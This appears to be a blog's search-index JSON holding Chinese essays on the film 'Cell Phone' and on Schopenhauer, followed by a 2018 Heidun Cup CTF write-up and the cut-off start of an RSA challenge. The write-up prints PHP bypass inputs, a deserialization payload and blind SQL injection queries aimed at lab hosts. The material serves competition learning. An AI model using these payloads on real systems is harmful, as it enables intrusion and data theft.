我相信当时沈雪是真诚地想知道自己在别人眼中的样子，并且不论好坏她不会对评价人有任何看法。但在严守礼老婆眼里，这事显得有些滑稽，我找不出别的词语来，总之是好笑。两个女人有着相似的天真和善良，但在某些方面又截然不同，沈雪属于率性，是真诚、好奇、独立思考的受过良好教育的知识分子，严守礼媳妇则依赖本性，喜欢吃，喜欢漂亮衣服，基于简单经验生活。\n我听说过并认可一个理论，人表达的程度和表达环境所能提供的安全感有关。如果感到亲密、安全、可信任，就会说得多、深、直白，如果感到疏离、危险、不可信任，就会说得少、浅、委婉。严守礼媳妇儿觉得当面表达对对方的看法是不合适的，那么就意味着从不谈或是背着当事人谈是可以接受的。这中间区别何在？区别在于当事人是否会知道以及表达者是否需要直面当事人。如果是觉得谈可以，但在背后，当面不成，那其实是不太合逻辑的，因为表达已经发生，当事人是否知道并不是表达者可控的，既然认可评价他人是可接受的行为，那么在哪里评价区别并不大。如果是觉得任何时间、地点、场合不能评价任何人，在我看来严守礼媳妇儿很难有这样的自觉和克制，何况她刚刚谈过于文娟和李燕。那么很有可能是这样的，她觉得评价人没太大问题，但没有太思考过当面和背后做这件事的本质区别，只是觉得当面这样做是尴尬的，有点搞笑的。这其实也是绝大数的情况，话可以说，但不能这么说，要那么说，事可以做，但不能这么做，要那么做。偏执的人就可能问，说也说了，做也做了，弯弯绕岂不虚伪？偏执就是这个意思，偏而执之，冥顽不灵。冥顽不灵者很难改变，尽管他们自己不觉得，我可能就是其一。人分感性和理性，一个事不合逻辑，但让人舒服，这就是这事成立的道理。\n所谓交浅言深的浅和深就是信任与表达的程度问题。人们从来比较相信，对着一个或一群不熟悉的人坦诚彻底地表露自己的好恶、观点是危险和不明智的，就像在室外赤身裸体。但偏执的人还是想问，赤身裸体怎么了，造物之精妙不能见人吗？古往今来，曝裈当屋算得上是比较经典的了，但即便是刘伶这样的，也 由于当时的血腥统治，不能直抒胸臆，不得不采用比兴、象征、神话等手法，隐晦曲折地表达自己的思想感情。 ，由此可见，说不该说的话大概比不穿裤子还要可怕。\n爱想的又常常爱说，所以小说这样的虚构作品是一种折衷的方式。冯唐想说 其实我们最终都是要亮出阳具的，但是一开始就亮的是露阴犯，大婚之后的是行天地之礼。 ，王小波想说 世界上的人分两种，龟头血肿之人和龟头不肿之人。你要龟头不肿的人理解血肿之痛，那是完全不可能的。唯一的办法是照他裆下猛踢一脚，让他也肿起来。 ，嬉笑背后想表达的东西，都得借助小说， 不太能直接发一条微博的，这是他们的智慧。然而也有人直言 尔曹身与名俱灭，不废江河万古流。 ，一个人在 **、真诚、智慧三样东西中，只可能拥有两样。 ，这是他们的勇气。勇气是易得的，但需要经受考验，智慧是难得的，但属于委曲求全。\n想来我也曾追着别人问你怎么看我，他们有些严肃一谈，有些委婉一笑，但没有像严守礼媳妇那样说 你真有意思 的，所以我也不知道这个行为到底有没意思，又是怎么个意思。\n真诚常常是不合时宜的，不合时宜意味着尴尬，甚至危险，那么就需要勇气或者智慧。如果都没有，可能闭嘴就会比较合适一些。\n《手机》语录\n手机连着你的嘴，嘴巴连着你的心。你们这手机里头有好多不可告人的东西。 近，太近咯，近得人都喘不过气来咯。——费墨 严守一回北京后，再也没有用手机。 我不用手机，没人找我。——于文娟 牛三斤，牛三斤，你的媳妇叫吕桂花。吕桂花让问一问，最近你还回来吗？ ","permalink":"https://ret2neo.cn/mind/180928-funny-solemnity/","summary":"高中时读了刘震云的《手机》和半本《英雄时代》(误，后者是柳建伟的书，两本书是从同一个朋友那儿借的，因而产生了错误的联系)，前段时间看了根据《手机》改编的同名电影和电视剧（2018/4/22 15:04~2018/4/26 1:21），其中有一幕印象深刻。当时只记下大概，想在这个睡不着觉的凌晨谈谈。\n沈雪跟着严守一回河南严家庄见严守一的奶，沈雪和严守礼的老婆一起聊天。沈雪问了严守礼老婆对严守一前妻于文娟的看法，又问了对费墨老婆李燕的看法，最后问到对自己的看法，这个被黑砖头称为喂猪娘们的女人扑哧笑了，又弯着腰笑了很久，终于抬头说，城里女人真有意思，这种话能当面问吗？ 。 我相信当时沈雪是真诚地想知道自己在别人眼中的样子，并且不论好坏她不会对评价人有任何看法。但在严守礼老婆眼里，这事显得有些滑稽，我找不出别的词语来，总之是好笑。两个女人有着相似的天真和善良，但在某些方面又截然不同，沈雪属于率性，是真诚、好奇、独立思考的受过良好教育的知识分子，严守礼媳妇则依赖本性，喜欢吃，喜欢漂亮衣服，基于简单经验生活。\n我听说过并认可一个理论，人表达的程度和表达环境所能提供的安全感有关。如果感到亲密、安全、可信任，就会说得多、深、直白，如果感到疏离、危险、不可信任，就会说得少、浅、委婉。严守礼媳妇儿觉得当面表达对对方的看法是不合适的，那么就意味着从不谈或是背着当事人谈是可以接受的。这中间区别何在？区别在于当事人是否会知道以及表达者是否需要直面当事人。如果是觉得谈可以，但在背后，当面不成，那其实是不太合逻辑的，因为表达已经发生，当事人是否知道并不是表达者可控的，既然认可评价他人是可接受的行为，那么在哪里评价区别并不大。如果是觉得任何时间、地点、场合不能评价任何人，在我看来严守礼媳妇儿很难有这样的自觉和克制，何况她刚刚谈过于文娟和李燕。那么很有可能是这样的，她觉得评价人没太大问题，但没有太思考过当面和背后做这件事的本质区别，只是觉得当面这样做是尴尬的，有点搞笑的。这其实也是绝大数的情况，话可以说，但不能这么说，要那么说，事可以做，但不能这么做，要那么做。偏执的人就可能问，说也说了，做也做了，弯弯绕岂不虚伪？偏执就是这个意思，偏而执之，冥顽不灵。冥顽不灵者很难改变，尽管他们自己不觉得，我可能就是其一。人分感性和理性，一个事不合逻辑，但让人舒服，这就是这事成立的道理。\n所谓交浅言深的浅和深就是信任与表达的程度问题。人们从来比较相信，对着一个或一群不熟悉的人坦诚彻底地表露自己的好恶、观点是危险和不明智的，就像在室外赤身裸体。但偏执的人还是想问，赤身裸体怎么了，造物之精妙不能见人吗？古往今来，曝裈当屋算得上是比较经典的了，但即便是刘伶这样的，也 由于当时的血腥统治，不能直抒胸臆，不得不采用比兴、象征、神话等手法，隐晦曲折地表达自己的思想感情。 ，由此可见，说不该说的话大概比不穿裤子还要可怕。\n爱想的又常常爱说，所以小说这样的虚构作品是一种折衷的方式。冯唐想说 其实我们最终都是要亮出阳具的，但是一开始就亮的是露阴犯，大婚之后的是行天地之礼。 ，王小波想说 世界上的人分两种，龟头血肿之人和龟头不肿之人。你要龟头不肿的人理解血肿之痛，那是完全不可能的。唯一的办法是照他裆下猛踢一脚，让他也肿起来。 ，嬉笑背后想表达的东西，都得借助小说， 不太能直接发一条微博的，这是他们的智慧。然而也有人直言 尔曹身与名俱灭，不废江河万古流。 ，一个人在 **、真诚、智慧三样东西中，只可能拥有两样。 ，这是他们的勇气。勇气是易得的，但需要经受考验，智慧是难得的，但属于委曲求全。\n想来我也曾追着别人问你怎么看我，他们有些严肃一谈，有些委婉一笑，但没有像严守礼媳妇那样说 你真有意思 的，所以我也不知道这个行为到底有没意思，又是怎么个意思。\n真诚常常是不合时宜的，不合时宜意味着尴尬，甚至危险，那么就需要勇气或者智慧。如果都没有，可能闭嘴就会比较合适一些。\n《手机》语录\n手机连着你的嘴，嘴巴连着你的心。你们这手机里头有好多不可告人的东西。 近，太近咯，近得人都喘不过气来咯。——费墨 严守一回北京后，再也没有用手机。 我不用手机，没人找我。——于文娟 牛三斤，牛三斤，你的媳妇叫吕桂花。吕桂花让问一问，最近你还回来吗？ ","title":"真诚与滑稽"},{"content":" 我们离开这个世界的时候，这个世界还是照样愚蠢和邪恶，跟我们刚来到这个世界的时候所发现的并没有两样。——伏尔泰\n今天是2018年的中秋，无线电活跃着，手机震动着，头像闪烁着，美好愿望在亲密、熟识、数面之缘、互有耳闻、素不相识的人们之间传播着，一派自然而然，喜悦欢快的景象。而我熄灭屏幕，看见生活如旧，不安依然。\n人们不说 中秋暴富 ，中秋成名 ，而是说 中秋快乐 ，除羞于直言外，可能说明有意识或无意识地，人们归根结底想要的是快乐和幸福。如果幸福是指称心、愉快地生存，使生存是因幸福本身而非恐惧死亡，使我们渴望生存永续，那么叔本华的哲学已经清晰地指出了幸福生存从形而上出发是不存在的。而人生的智慧就在于离开高角度，从形而上转到形而下，承认相对的价值，预设幸福的存在，然后从平常、实用的角度去探讨和追求。\n亚里士多德将人在世上的一切三分为外物，人的身体和人的灵魂，叔本华则有另一种三分方式：\n①人的自身，即在最广泛意义上属于人的个性的东西。因此，它包括人的健康、力量、外貌、气质、道德品格、精神智力及其潜在发展。\n②人所拥有的身外之物，亦即财产和其他占有物。\n③人向其他人所显示的样子，这可以理解为：人在其他人眼中所呈现的样子，以及人们对他的看法。他人的看法又可分为名誉、地位和名声。\n如果将②③称为客体，将①称为主体，叔本华认为客体经由主体作用于人，因此主体无可避免地对人幸福与否具有根本而彻底的影响。主体是持久不变而不可予夺的，客体则相反，因此获得幸福的要义在于尽力使客体自洽于主体，体力强的从事体力活动，脑力强的从事脑力活动，好竞争的浪头弄潮，随缘分的皓月扁舟，各得其所，各安其心。至于追逐财富，在叔本华看来则是舍本逐末， 财富除了能满足人的真正、自然的需求以外，对我们的真正幸福没有多大影响 。叔本华很有钱，而我没有，所以我还不懂。\n叔本华说 ，“如果一个人能够享有自己卓越的、与众不同的精神个性所带来的乐趣，那么普通大众所追求的大部分乐趣对于他来说，都是纯属多余的，甚至是一种烦恼和累赘。” 。我基本赞同这样的观点，但问题在于，普通大众在审视主体客体关系时如何自处？换言之，如果我的精神个性是标配的，乏味无趣的，那么我注定无法 超越只能领略平庸无奇、夹杂着动物性的快乐的范围 吗？当笨蛋发现自己笨时，他还是一个笨蛋吗？如果他觉得聪明比笨好，又有意变得聪明，却不幸任何努力都无助于改变笨的事实，那他会成长为一个怎样的笨蛋呢？除了痛苦别无出路吗？\n美丽与丑陋，健壮与羸弱，聪明与愚钝，善良与罪恶，博爱与自私，社会对个人的评价体系中存在许多诸如此类的对立，分别之心也因此普遍存在。而如果主体是不可改变的，笨蛋至死是笨蛋，那一个有自知之明的笨蛋，姑且称他为笨蛋吧，如何获得属于他的幸福呢？\n叔本华认为 最高级、最丰富多彩以及维持最为恒久的乐趣是精神思想上的乐趣 。也许是因为经历不足，我对此持怀疑态度。乐趣作为主观感受，区分高低级是否是偏见？假设感官上的刺激能够不断升级变化，它所带来的乐趣在丰富性和恒久性方面与精神乐趣何异？况且丰富恒久的思想乐趣并不见得比丰富恒久的感官乐趣易得。\n如果将主体简化为人的个性，有一些问题是不应急于断言，值得思考的。\n人如何认识自己的个性\n个性是可以改变的吗\n如果个性可以改变，如何改变\n如果个性不能改变，如何顺应个性以获得幸福\n顺应个性在多大程度上可能\n职业选择 婚姻选择 …… 也许我对人们的腼腆程度和戏谑限度有些误解吧，一觉醒来表情包已经铺天盖地 😲\n⬇⬇⬇⬇⬇\n⬇⬇⬇⬇⬇\n⬇⬇⬇⬇⬇\n⬇⬇⬇⬇⬇\n","permalink":"https://ret2neo.cn/mind/180924-happy-mid-autumn-festival/","summary":"我们离开这个世界的时候，这个世界还是照样愚蠢和邪恶，跟我们刚来到这个世界的时候所发现的并没有两样。——伏尔泰\n今天是2018年的中秋，无线电活跃着，手机震动着，头像闪烁着，美好愿望在亲密、熟识、数面之缘、互有耳闻、素不相识的人们之间传播着，一派自然而然，喜悦欢快的景象。而我熄灭屏幕，看见生活如旧，不安依然。\n人们不说 中秋暴富 ，中秋成名 ，而是说 中秋快乐 ，除羞于直言外，可能说明有意识或无意识地，人们归根结底想要的是快乐和幸福。如果幸福是指称心、愉快地生存，使生存是因幸福本身而非恐惧死亡，使我们渴望生存永续，那么叔本华的哲学已经清晰地指出了幸福生存从形而上出发是不存在的。而人生的智慧就在于离开高角度，从形而上转到形而下，承认相对的价值，预设幸福的存在，然后从平常、实用的角度去探讨和追求。\n亚里士多德将人在世上的一切三分为外物，人的身体和人的灵魂，叔本华则有另一种三分方式：\n①人的自身，即在最广泛意义上属于人的个性的东西。因此，它包括人的健康、力量、外貌、气质、道德品格、精神智力及其潜在发展。\n②人所拥有的身外之物，亦即财产和其他占有物。\n③人向其他人所显示的样子，这可以理解为：人在其他人眼中所呈现的样子，以及人们对他的看法。他人的看法又可分为名誉、地位和名声。\n如果将②③称为客体，将①称为主体，叔本华认为客体经由主体作用于人，因此主体无可避免地对人幸福与否具有根本而彻底的影响。主体是持久不变而不可予夺的，客体则相反，因此获得幸福的要义在于尽力使客体自洽于主体，体力强的从事体力活动，脑力强的从事脑力活动，好竞争的浪头弄潮，随缘分的皓月扁舟，各得其所，各安其心。至于追逐财富，在叔本华看来则是舍本逐末， 财富除了能满足人的真正、自然的需求以外，对我们的真正幸福没有多大影响 。叔本华很有钱，而我没有，所以我还不懂。\n叔本华说 ，“如果一个人能够享有自己卓越的、与众不同的精神个性所带来的乐趣，那么普通大众所追求的大部分乐趣对于他来说，都是纯属多余的，甚至是一种烦恼和累赘。” 。我基本赞同这样的观点，但问题在于，普通大众在审视主体客体关系时如何自处？换言之，如果我的精神个性是标配的，乏味无趣的，那么我注定无法 超越只能领略平庸无奇、夹杂着动物性的快乐的范围 吗？当笨蛋发现自己笨时，他还是一个笨蛋吗？如果他觉得聪明比笨好，又有意变得聪明，却不幸任何努力都无助于改变笨的事实，那他会成长为一个怎样的笨蛋呢？除了痛苦别无出路吗？\n美丽与丑陋，健壮与羸弱，聪明与愚钝，善良与罪恶，博爱与自私，社会对个人的评价体系中存在许多诸如此类的对立，分别之心也因此普遍存在。而如果主体是不可改变的，笨蛋至死是笨蛋，那一个有自知之明的笨蛋，姑且称他为笨蛋吧，如何获得属于他的幸福呢？\n叔本华认为 最高级、最丰富多彩以及维持最为恒久的乐趣是精神思想上的乐趣 。也许是因为经历不足，我对此持怀疑态度。乐趣作为主观感受，区分高低级是否是偏见？假设感官上的刺激能够不断升级变化，它所带来的乐趣在丰富性和恒久性方面与精神乐趣何异？况且丰富恒久的思想乐趣并不见得比丰富恒久的感官乐趣易得。\n如果将主体简化为人的个性，有一些问题是不应急于断言，值得思考的。\n人如何认识自己的个性\n个性是可以改变的吗\n如果个性可以改变，如何改变\n如果个性不能改变，如何顺应个性以获得幸福\n顺应个性在多大程度上可能\n职业选择 婚姻选择 …… 也许我对人们的腼腆程度和戏谑限度有些误解吧，一觉醒来表情包已经铺天盖地 😲\n⬇⬇⬇⬇⬇\n⬇⬇⬇⬇⬇\n⬇⬇⬇⬇⬇\n⬇⬇⬇⬇⬇","title":"《人生的智慧·一》"},{"content":"2018/9/16 福师大黑盾杯\n信息泄露+代码审计 svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php error_reporting(0); $user = $_COOKIE[\u0026#39;user\u0026#39;]; $code = $_GET[\u0026#39;code\u0026#39;]?(int)$_GET[\u0026#39;code\u0026#39;]:\u0026#39;\u0026#39;; if($user == \u0026#39;admin\u0026#39; \u0026amp;\u0026amp; !empty($code)) { $hex = (int)$code; if(($hex ^ 6789) === 0xCDEF) { require(\u0026#34;flag.php\u0026#34;); echo $flag; exit(); }\techo \u0026#34;ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������\u0026#34;; ?\u0026gt; GET 请求code=55146 ， 请求头添加Cookie: user=admin; 。\nflag{a737c5c5b759c3705c8100accf65b5e4}\n最好的语言 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 \u0026lt;?php show_source(__FILE__); $a=0; $b=0; $c=0; $d=0; if (isset($_GET[\u0026#39;x1\u0026#39;])) //$x1=0;=\u0026gt;$a=1; { $x1 = $_GET[\u0026#39;x1\u0026#39;]; $x1==\u0026#34;1\u0026#34;?die(\u0026#34;ha?\u0026#34;):NULL; switch ($x1) { case 0: case 1: $a=1; break; } } $x2=(array)json_decode(@$_GET[\u0026#39;x2\u0026#39;]); //$x2=json_encode([\u0026#39;x21\u0026#39;=\u0026gt;\u0026#39;2018hello\u0026#39;,\u0026#39;x22\u0026#39;=\u0026gt;[[],0]]) ; //string(32) \u0026#34;{\u0026#34;x21\u0026#34;:\u0026#34;2018hello\u0026#34;,\u0026#34;x22\u0026#34;:[[],0]}\u0026#34; if(is_array($x2)){ is_numeric(@$x2[\u0026#34;x21\u0026#34;])?die(\u0026#34;ha?\u0026#34;):NULL; if(@$x2[\u0026#34;x21\u0026#34;]){ ($x2[\u0026#34;x21\u0026#34;]\u0026gt;2017)?$b=1:NULL; } if(is_array(@$x2[\u0026#34;x22\u0026#34;])){ if(count($x2[\u0026#34;x22\u0026#34;])!==2 OR !is_array($x2[\u0026#34;x22\u0026#34;][0])) die(\u0026#34;ha?\u0026#34;); $p = array_search(\u0026#34;XIPU\u0026#34;, $x2[\u0026#34;x22\u0026#34;]); //array_search — 在数组中搜索给定的值，如果成功则返回相应的键名 //mixed array_search( mixed $needle, array $haystack[, bool $strict = false] ) //第三个参数决定在搜索时是否比较类型，默认不比较，也是这里能够绕过的原因。 //var_dump(array_search(\u0026#39;XIPU\u0026#39;, array(\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;,0)));//int(2) //0==‘XIPU’为真，搜索到0值的下标为2 $p===false?die(\u0026#34;ha?\u0026#34;):NULL; foreach($x2[\u0026#34;x22\u0026#34;] as $key=\u0026gt;$val){ $val===\u0026#34;XIPU\u0026#34;?die(\u0026#34;ha?\u0026#34;):NULL; } $c=1; } } $x3 = $_GET[\u0026#39;x3\u0026#39;]; if ($x3 != \u0026#39;15562\u0026#39;) { if (strstr($x3, \u0026#39;XIPU\u0026#39;)) { if (substr(md5($x3),8,16) == substr(md5(\u0026#39;15562\u0026#39;),8,16)) { //两个符合正则 /0e\\d+/ 的字符串弱相等。 // 爆破见下方python代码 $d=1; } } } if($a \u0026amp;\u0026amp; $b \u0026amp;\u0026amp; $c \u0026amp;\u0026amp; $d){ include \u0026#34;flag.php\u0026#34;; echo $flag; } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 def brute(): for a in range(0x20, 0x7f): for b in range(0x20, 0x7f): for c in range(0x20, 0x7f): x = chr(a) + chr(b) + chr(c)+s mm=md5(x.encode(\u0026#39;UTF-8\u0026#39;)).hexdigest() flag=1 for i in mm[10:24]: if i not in \u0026#39;0123456789\u0026#39;: flag=0 break if flag and mm[8:10]==\u0026#39;0e\u0026#39;: print(x) brute() # kN[XIPU # v=|XIPU # y\u0026#39;wXIPU # }MOXIPU # ~VhXIPU ## http://192.168.200.200/web/bestlanguage/?x1=0\u0026amp;x2={%22x21%22:%222018hello%22,%22x22%22:[[],0]}\u0026amp;x3=~VhXIPU ## flag{510ea2879fa29d0d618b1f55350965c3} the user is admin 和 bugku 平台某个题目原理相似，因此没有保留源码。可以参考 该题 ，不赘述。\n1 2 3 4 5 /web/theuserisadmin/?file=class.php\u0026amp;user=php://input\u0026amp;pass=O:4:\u0026#34;Read\u0026#34;:1:{s:4:\u0026#34;file\u0026#34;;s:8:\u0026#34;f1a9.php\u0026#34;;} post:the user is admin //flag{078d8dd8023d5716a11780adf344dfd2} ccgs 1 2 binwalk -e sgcc.png cat secret.txt | base64 -d | base64 -d \u0026gt; final.png 注入日志分析 给了一个日志文件，file data.log得到是一个文本文件，直接打开，前几行是\n1 2 3 #Software: Microsoft Internet Information Services 6.0 #Version: 1.0 #Date: 2015-10-21 09:16:34 猜测是IIS服务器记录的流量日志， 分析前几行\n1 2 3 4 2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /index.htm - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0 2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /favicon.ico - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 404 0 2 2015-10-21 09:16:36 W3SVC1 192.168.1.135 GET /show.asp id=2 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0 2015-10-21 09:25:01 W3SVC1 192.168.1.135 GET /show.asp id=2%27|17|80040e14|字符串_\u0026#39;\u0026#39;_之前有未闭合的引号。 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 500 0 0 可以看到就是一条条的HTTP请求，并且后面跟着状态码。继续浏览，看到id字段出现一些SQL的关键字，那么可以想到这记录的就是sqlmap(或许)的注入流量分析。思路就是找到关键的注入请求，文件很大，我们可以搜索flag试试，找到关键的请求如下\n1 2 3 4 ... 2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0 2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0 ... 可以利用文本编辑器如sublime text 3的ctrl+H的替换功能， 将关键流量进行精简并urldecode利于分析(截取两个代表性请求)\n1 2 id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))\u0026gt;51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 500 0 0 id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))\u0026gt;48 80 200 0 0 可以看到这里是二分法盲注的HTTP请求，现在思路很明确了， 从SUBSTRING(.*, 1, 1)开始找，并且只要看最后几条的注入请求就可以判断出字符是多少。 比如SUBSTRING(.*, 1, 1) \u0026gt; 48的状态码是200，SUBSTRING(.*, 1, 1) \u0026gt; 49的状态码是500，那其实就可以确定字符的ascii码是49。就这样就能得到theflag的值。\nbrightstar 列移位密码\n1 2 3 snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees key： howarey Columnar Transposition Cipher h o w a r e y 3 4 6 1 5 2 7 I t i s o f t e n i n t h e d a r k e s t s k i e s t h a t w e s e e b r i g h t e s t s t a r s 或者\n1 2 3 4 5 c=\u0026#39;snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees\u0026#39;.split(\u0026#39; \u0026#39;) k=\u0026#39;howarey\u0026#39; kk=sorted(k) print(\u0026#39;\u0026#39;.join(c[kk.index(j)][i] for i in range(len(k)) for j in k)) # Itisofteninthedarkestskiesthatweseebrighteststars 这是啥呀 base32编码\n1 2 echo MZWGCZ33MM4GENJVHBRDSNJUGAYTSOBVGZTDAYRQGIZTINLEMMZTSNJVHBRX2=== | base32 -d #flag{c8b558b954019856f0b02345dc39558c} Windows逆向 1 2 3 4 5 6 7 s=\u0026#39;sKfxEeft}f{gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\\0087138\u0026#39; flag=\u0026#39;\u0026#39; idx=[1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42] for i in idx: flag+=s[i] print(flag) # KEY{e2s6ry3r5s8f6 得到部分flag，加上1024}得到完整flag：KEY{e2s6ry3r5s8f61024}\nreverseme 1 2 3 python -c \u0026#34;open(\u0026#39;file.png\u0026#39;,\u0026#39;wb\u0026#39;).write(open(\u0026#39;reverseme\u0026#39;,\u0026#39;rb\u0026#39;).read()[::-1])\u0026#34; 或 \u0026lt;reverseme xxd -p -c1 | tac | xxd -p -r \u0026gt;file.png 1 convert -flop file.png mirror_file.png 下午 CMSeeK 扫出配置文件 http://192.168.200.202//configuration.php.txt\n底部有flag: flag{0b58f603ff55c0c190502b44b4ffbf2c}\n此外一些没进一步利用上的信息和部分题目的附件放在GiIthub ，有兴趣可移步查看。\n","permalink":"https://ret2neo.cn/post/180920-heidunbei/","summary":"2018/9/16 福师大黑盾杯\n信息泄露+代码审计 svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php error_reporting(0); $user = $_COOKIE[\u0026#39;user\u0026#39;]; $code = $_GET[\u0026#39;code\u0026#39;]?(int)$_GET[\u0026#39;code\u0026#39;]:\u0026#39;\u0026#39;; if($user == \u0026#39;admin\u0026#39; \u0026amp;\u0026amp; !empty($code)) { $hex = (int)$code; if(($hex ^ 6789) === 0xCDEF) { require(\u0026#34;flag.php\u0026#34;); echo $flag; exit(); }\techo \u0026#34;ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������\u0026#34;; ?\u0026gt; GET 请求code=55146 ， 请求头添加Cookie: user=admin; 。\nflag{a737c5c5b759c3705c8100accf65b5e4}\n最好的语言 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 \u0026lt;?","title":"福建省黑盾杯解题报告"},{"content":"Problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #!/usr/bin/env python import gmpy from Crypto.Util.number import * from secret import x, y, flag assert gmpy.is_prime(y) ** 2016 + gmpy.is_prime(x+1) ** 2017 + ((x**2 - 1)**2 % (2*x*y - 1) + 2) ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 p = gmpy.next_prime(x**3 + y**3) #(x+y)**3-3xy(x+y) q = gmpy.next_prime(x**2*y + y**2*x) #xy(x+y) n = p * q phi = (p-1)*(q-1) d = gmpy.invert(0x10001, phi) enc = pow(bytes_to_long(flag), 0x10001, n) print \u0026#39;n =\u0026#39;, n print \u0026#39;enc =\u0026#39;, enc # n = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741 # enc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612 Solve 由于\n1 1+1+2**2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 所以 x+1和 y 都是质数，(x**2 - 1)**2 % (2*x*y - 1)==0 。\n根据数学推理或者大胆瞎猜得到 x=2y ，然后代入生成p和q，以pq==n 为条件爆破y即可。\n来自 官方WP 的解题脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 #!/usr/bin/env python # Show that if 4ab - 1 divides (4a**2 - 1)**2, then a = b. # suppose y be a large prime and x + 1 is another large prime. import gmpy from Crypto.Util.number import * # from this condition with help of previous fact we can deduce that: # ==\u0026gt; we take 2a = x and b = y, so: 2xy - 1 